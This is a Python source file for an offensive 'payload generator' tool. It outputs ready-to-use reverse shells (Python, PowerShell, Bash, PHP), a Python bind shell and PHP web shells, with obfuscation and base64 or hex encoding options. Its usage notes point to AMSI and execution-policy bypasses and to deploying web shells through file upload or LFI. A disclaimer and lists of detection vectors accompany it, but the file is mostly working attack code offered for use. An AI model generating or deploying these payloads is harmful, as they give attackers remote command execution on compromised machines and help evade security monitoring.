#!/usr/bin/env python3
"""
Payload Generator - Generate various payload formats for penetration testing
Supports reverse shells, bind shells, and web shells for multiple platforms

DISCLAIMER: This tool is for authorized security testing and educational purposes only.
Unauthorized use of this tool is illegal and unethical.
"""

import argparse
import base64
import sys
import json
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, asdict
from abc import ABC, abstractmethod


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    payload_type: str  # reverse_shell, bind_shell, web_shell
    language: str  # python, powershell, bash, php, perl, ruby
    lhost: str = ""
    lport: int = 4444
    encoding: Optional[str] = None  # base64, hex, none
    obfuscation_level: int = 0  # 0-3
    platform: str = "linux"  # linux, windows, cross


@dataclass
class PayloadOutput:
    """Generated payload output"""
    payload: str
    language: str
    payload_type: str
    encoding: str
    notes: List[str]
    detection_considerations: List[str]


class PayloadTemplate(ABC):
    """Abstract base class for payload templates"""

    @abstractmethod
    def generate(self, config: PayloadConfig) -> str:
        """Generate the payload string"""
        pass

    @abstractmethod
    def get_notes(self) -> List[str]:
        """Get usage notes for this payload"""
        pass

    @abstractmethod
    def get_detection_vectors(self) -> List[str]:
        """Get known detection vectors"""
        pass


class PythonReverseShell(PayloadTemplate):
    """Python reverse shell payload generator"""

    def generate(self, config: PayloadConfig) -> str:
        basic = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{config.lhost}",{config.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''

        if config.obfuscation_level >= 1:
            # Simple variable name obfuscation
            basic = basic.replace("socket", "__import__('socket').socket")
            basic = basic.replace("subprocess", "__import__('subprocess')")
            basic = basic.replace("os", "__import__('os')")

        return basic

    def get_notes(self) -> List[str]:
        return [
            "Requires Python 2.7+ or Python 3.x",
            "Uses /bin/sh - modify for Windows targets",
            "Blocking connection - shell hangs if listener not ready"
        ]

    def get_detection_vectors(self) -> List[str]:
        return [
            "Network connection to external IP",
            "Process spawning /bin/sh",
            "File descriptor duplication syscalls",
            "Known payload signatures in memory"
        ]


class PowerShellReverseShell(PayloadTemplate):
    """PowerShell reverse shell payload generator"""

    def generate(self, config: PayloadConfig) -> str:
        basic = f'''$client = New-Object System.Net.Sockets.TCPClient("{config.lhost}",{config.lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()'''

        if config.obfuscation_level >= 1:
            # Basic string concatenation obfuscation
            basic = basic.replace("TCPClient", "TCP'+'Client")
            basic = basic.replace("System.Net.Sockets", "Sys'+'tem.Net.Soc'+'kets")

        if config.obfuscation_level >= 2:
            # Variable name randomization would go here
            pass

        return basic

    def get_notes(self) -> List[str]:
        return [
            "Requires PowerShell 2.0+",
            "May trigger AMSI - consider bypass",
            "Execution policy may block - use bypass flags",
            "Consider encoding for command line delivery"
        ]

    def get_detection_vectors(self) -> List[str]:
        return [
            "AMSI scanning",
            "PowerShell script block logging",
            "Network connection monitoring",
            "TCPClient class usage",
            "Invoke-Expression (iex) usage"
        ]


class BashReverseShell(PayloadTemplate):
    """Bash reverse shell payload generator"""

    def generate(self, config: PayloadConfig) -> str:
        variants = {
            0: f'bash -i >& /dev/tcp/{config.lhost}/{config.lport} 0>&1',
            1: f'/bin/bash -c "bash -i >& /dev/tcp/{config.lhost}/{config.lport} 0>&1"',
            2: f'0<&196;exec 196<>/dev/tcp/{config.lhost}/{config.lport}; sh <&196 >&196 2>&196',
        }
        return variants.get(config.obfuscation_level, variants[0])

    def get_notes(self) -> List[str]:
        return [
            "Requires bash with /dev/tcp support",
            "Not available on all systems (e.g., Debian default)",
            "Alternative: use nc, python, or perl payloads"
        ]

    def get_detection_vectors(self) -> List[str]:
        return [
            "/dev/tcp access monitoring",
            "Outbound connection from shell process",
            "File descriptor redirection patterns"
        ]


class PHPReverseShell(PayloadTemplate):
    """PHP reverse shell payload generator"""

    def generate(self, config: PayloadConfig) -> str:
        basic = f'''<?php
$sock=fsockopen("{config.lhost}",{config.lport});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'''

        if config.obfuscation_level >= 1:
            basic = f'''<?php
$a="{config.lhost}";$b={config.lport};
$c=str_rot13("sfbcra");$c="f".$c;
$s=$c($a,$b);
$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$x);
?>'''

        return basic

    def get_notes(self) -> List[str]:
        return [
            "Requires allow_url_fopen or fsockopen enabled",
            "proc_open must not be in disable_functions",
            "Alternative: use exec(), system(), passthru()"
        ]

    def get_detection_vectors(self) -> List[str]:
        return [
            "Web application firewall rules",
            "PHP disable_functions bypass attempts",
            "Outbound connections from web server",
            "Process spawning from PHP"
        ]


class PHPWebShell(PayloadTemplate):
    """PHP web shell payload generator"""

    def generate(self, config: PayloadConfig) -> str:
        shells = {
            0: '<?php system($_GET["cmd"]); ?>',
            1: '<?php echo shell_exec($_REQUEST["cmd"]); ?>',
            2: '<?php $a="sys"."tem";$a($_GET["c"]); ?>',
            3: '<?php $f=base64_decode("c3lzdGVt");$f($_GET[chr(99)]); ?>',
        }
        return shells.get(config.obfuscation_level, shells[0])

    def get_notes(self) -> List[str]:
        return [
            "Simple command execution web shell",
            "Access via: http://target/shell.php?cmd=whoami",
            "Consider file upload or LFI for deployment"
        ]

    def get_detection_vectors(self) -> List[str]:
        return [
            "Web shell signatures in files",
            "Unusual PHP file in web root",
            "Command execution from web process",
            "WAF detection of shell patterns"
        ]


class PythonBindShell(PayloadTemplate):
    """Python bind shell payload generator"""

    def generate(self, config: PayloadConfig) -> str:
        return f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",{config.lport}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''

    def get_notes(self) -> List[str]:
        return [
            "Binds to all interfaces on specified port",
            "Requires port not in use",
            "May require elevated privileges for low ports"
        ]

    def get_detection_vectors(self) -> List[str]:
        return [
            "Listening port detection",
            "Inbound connection to unusual port",
            "Process binding to network socket"
        ]


class PayloadGenerator:
    """Main payload generator class"""

    def __init__(self):
        self.templates: Dict[str, Dict[str, PayloadTemplate]] = {
            "reverse_shell": {
                "python": PythonReverseShell(),
                "powershell": PowerShellReverseShell(),
                "bash": BashReverseShell(),
                "php": PHPReverseShell(),
            },
            "bind_shell": {
                "python": PythonBindShell(),
            },
            "web_shell": {
                "php": PHPWebShell(),
            }
        }

    def get_available_payloads(self) -> Dict[str, List[str]]:
        """Get available payload types and languages"""
        return {ptype: list(langs.keys()) for ptype, langs in self.templates.items()}

    def generate(self, config: PayloadConfig) -> PayloadOutput:
        """Generate a payload based on configuration"""
        if config.payload_type not in self.templates:
            raise ValueError(f"Unknown payload type: {config.payload_type}")

        if config.language not in self.templates[config.payload_type]:
            available = list(self.templates[config.payload_type].keys())
            raise ValueError(f"Language '{config.language}' not available for {config.payload_type}. Available: {available}")

        template = self.templates[config.payload_type][config.language]
        payload = template.generate(config)

        # Apply encoding if requested
        encoding_applied = "none"
        if config.encoding == "base64":
            payload = base64.b64encode(payload.encode()).decode()
            encoding_applied = "base64"
        elif config.encoding == "hex":
            payload = payload.encode().hex()
            encoding_applied = "hex"

        return PayloadOutput(
            payload=payload,
            language=config.language,
            payload_type=config.payload_type,
            encoding=encoding_applied,
            notes=template.get_notes(),
            detection_considerations=template.get_detection_vectors()
        )

    def plan(self, config: PayloadConfig) -> str:
        """Generate a plan without executing"""
        output = []
        output.append("")
        output.append("[PLAN MODE] Tool: payload-generator")
        output.append("=" * 50)
        output.append("")
        output.append("Configuration:")
        output.append(f"  Payload Type: {config.payload_type}")
        output.append(f"  Language: {config.language}")
        output.append(f"  Target Host (LHOST): {config.lhost or 'Not specified'}")
        output.append(f"  Target Port (LPORT): {config.lport}")
        output.append(f"  Encoding: {config.encoding or 'none'}")
        output.append(f"  Obfuscation Level: {config.obfuscation_level}")
        output.append(f"  Platform: {config.platform}")
        output.append("")
        output.append("Actions to be performed:")
        output.append(f"  1. Load {config.language} {config.payload_type} template")
        output.append(f"  2. Substitute connection parameters (LHOST/LPORT)")
        if config.obfuscation_level > 0:
            output.append(f"  3. Apply obfuscation level {config.obfuscation_level}")
        if config.encoding:
            output.append(f"  4. Encode payload using {config.encoding}")
        output.append(f"  5. Output generated payload to stdout")
        output.append("")

        if config.payload_type in self.templates and config.language in self.templates[config.payload_type]:
            template = self.templates[config.payload_type][config.language]
            output.append("Detection Considerations:")
            for vector in template.get_detection_vectors():
                output.append(f"  - {vector}")
            output.append("")
            output.append("Usage Notes:")
            for note in template.get_notes():
                output.append(f"  - {note}")

        output.append("")
        output.append("Risk Assessment: LOW-MEDIUM (payload generation only)")
        output.append("No network connections or system modifications will be made.")
        output.append("")
        output.append("Remove --plan flag to generate the actual payload.")
        output.append("")

        return "\n".join(output)


def get_documentation() -> Dict:
    """
    Documentation hook for integration with documentation agent.
    Returns structured documentation for this tool.
    """
    return {
        "name": "Payload Generator",
        "version": "1.0.0",
        "category": "Payload Generation",
        "description": "Generate various payload formats for penetration testing including reverse shells, bind shells, and web shells.",
        "author": "Offensive Security Toolsmith",
        "usage": {
            "basic": "python payload_generator.py --type reverse_shell --lang python --lhost 10.0.0.1 --lport 4444",
            "with_encoding": "python payload_generator.py --type reverse_shell --lang powershell --lhost 10.0.0.1 --encoding base64",
            "planning": "python payload_generator.py --type reverse_shell --lang bash --plan"
        },
        "supported_payloads": {
            "reverse_shell": ["python", "powershell", "bash", "php"],
            "bind_shell": ["python"],
            "web_shell": ["php"]
        },
        "arguments": [
            {"name": "--type", "description": "Payload type (reverse_shell, bind_shell, web_shell)", "required": True},
            {"name": "--lang", "description": "Target language (python, powershell, bash, php)", "required": True},
            {"name": "--lhost", "description": "Listener host for reverse shells", "required": False},
            {"name": "--lport", "description": "Listener port (default: 4444)", "required": False},
            {"name": "--encoding", "description": "Output encoding (base64, hex)", "required": False},
            {"name": "--obfuscate", "description": "Obfuscation level 0-3", "required": False},
            {"name": "--plan", "description": "Show execution plan without generating", "required": False},
            {"name": "--list", "description": "List available payloads", "required": False},
            {"name": "--json", "description": "Output in JSON format", "required": False}
        ],
        "legal_notice": "This tool is for authorized security testing only. Unauthorized use is illegal.",
        "references": [
            "https://github.com/swisskyrepo/PayloadsAllTheThings",
            "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        ]
    }


def main():
    parser = argparse.ArgumentParser(
        description="Payload Generator - Generate reverse shells, bind shells, and web shells",
        epilog="DISCLAIMER: For authorized security testing only."
    )

    parser.add_argument("--type", "-t", dest="payload_type",
                        choices=["reverse_shell", "bind_shell", "web_shell"],
                        help="Type of payload to generate")
    parser.add_argument("--lang", "-l", dest="language",
                        choices=["python", "powershell", "bash", "php", "perl", "ruby"],
                        help="Target language for payload")
    parser.add_argument("--lhost", help="Listener host IP address")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument("--encoding", "-e", choices=["base64", "hex"],
                        help="Encode the output payload")
    parser.add_argument("--obfuscate", "-o", type=int, default=0, choices=[0, 1, 2, 3],
                        help="Obfuscation level (0-3)")
    parser.add_argument("--platform", choices=["linux", "windows", "cross"],
                        default="linux", help="Target platform")
    parser.add_argument("--plan", "-p", action="store_true",
                        help="Show execution plan without generating payload")
    parser.add_argument("--list", action="store_true",
                        help="List available payload types and languages")
    parser.add_argument("--json", "-j", action="store_true",
                        help="Output in JSON format")
    parser.add_argument("--doc", action="store_true",
                        help="Show tool documentation")

    args = parser.parse_args()

    generator = PayloadGenerator()

    # Handle documentation request
    if args.doc:
        docs = get_documentation()
        if args.json:
            print(json.dumps(docs, indent=2))
        else:
            print(f"\n{docs['name']} v{docs['version']}")
            print("=" * 50)
            print(f"\n{docs['description']}\n")
            print("Supported Payloads:")
            for ptype, langs in docs['supported_payloads'].items():
                print(f"  {ptype}: {', '.join(langs)}")
            print(f"\nLegal Notice: {docs['legal_notice']}")
        return 0

    # Handle list request
    if args.list:
        available = generator.get_available_payloads()
        if args.json:
            print(json.dumps(available, indent=2))
        else:
            print("\nAvailable Payloads:")
            print("-" * 30)
            for ptype, langs in available.items():
                print(f"  {ptype}:")
                for lang in langs:
                    print(f"    - {lang}")
        return 0

    # Validate required arguments for generation
    if not args.payload_type or not args.language:
        parser.print_help()
        print("\nError: --type and --lang are required for payload generation")
        return 1

    # Create configuration
    config = PayloadConfig(
        payload_type=args.payload_type,
        language=args.language,
        lhost=args.lhost or "CHANGEME",
        lport=args.lport,
        encoding=args.encoding,
        obfuscation_level=args.obfuscate,
        platform=args.platform
    )

    # Handle planning mode
    if args.plan:
        print(generator.plan(config))
        return 0

    # Generate payload
    try:
        result = generator.generate(config)

        if args.json:
            output = {
                "payload": result.payload,
                "metadata": {
                    "language": result.language,
                    "type": result.payload_type,
                    "encoding": result.encoding,
                    "notes": result.notes,
                    "detection_vectors": result.detection_considerations
                }
            }
            print(json.dumps(output, indent=2))
        else:
            print("\n" + "=" * 50)
            print(f"Generated {result.language} {result.payload_type}")
            print(f"Encoding: {result.encoding}")
            print("=" * 50 + "\n")
            print(result.payload)
            print("\n" + "-" * 50)
            print("Notes:")
            for note in result.notes:
                print(f"  - {note}")
            print("\nDetection Considerations:")
            for vector in result.detection_considerations:
                print(f"  - {vector}")
            print()

        return 0

    except ValueError as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1
    except Exception as e:
        print(f"Unexpected error: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
